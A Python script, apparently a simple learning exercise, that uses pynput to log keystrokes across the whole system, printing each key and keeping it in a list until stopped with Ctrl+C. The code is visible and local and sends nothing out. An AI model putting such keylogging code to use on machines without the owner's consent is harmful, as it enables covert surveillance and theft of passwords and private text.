from pynput import keyboard


collected_keys = []  # list to store the accumulated key logs

def on_press(key):
    try:
        char = key.char
        print(char, end='') 
        collected_keys.append(char) # add the recorded character to the list

    except AttributeError:
        # handle special keys i.e. Space, Enter, Shift, Ctrl, Alt
        if key == keyboard.Key.space:
            special_key_repr = "[SPACE]"
        elif key == keyboard.Key.enter:
            special_key_repr = "[ENTER]\n" # add newline for readability
        elif key == keyboard.Key.tab:
            special_key_repr = "[TAB]\t"
        elif key == keyboard.Key.backspace:
            special_key_repr = "[BACKSPACE]"
        else:
            # for other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
            special_key_repr = f"[{str(key).replace('Key.', '').upper()}]"
        
        print(special_key_repr, end='')
        collected_keys.append(special_key_repr) # add the recorded special character to the list


if __name__ == "__main__":
    print("--- Keylogger Started ---")
    print("Monitoring system-wide key inputs. Press Ctrl+C to stop.")
    print("-------------------------")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        # keep the main tread alive, this will be interrupted by Ctrl+C
        # a simple infinite loop or long sleep works
        while listener.running:
            pass

    except KeyboardInterrupt:
        print("\n-------------------------")
        print("Keylogger Stopped by User (Ctrl+C).")
        print(f"Total keys collected: {len(collected_keys)}")
        print("-------------------------")
    finally:
        listener.stop()
        listener.join()
        print("Keylogger process ended.")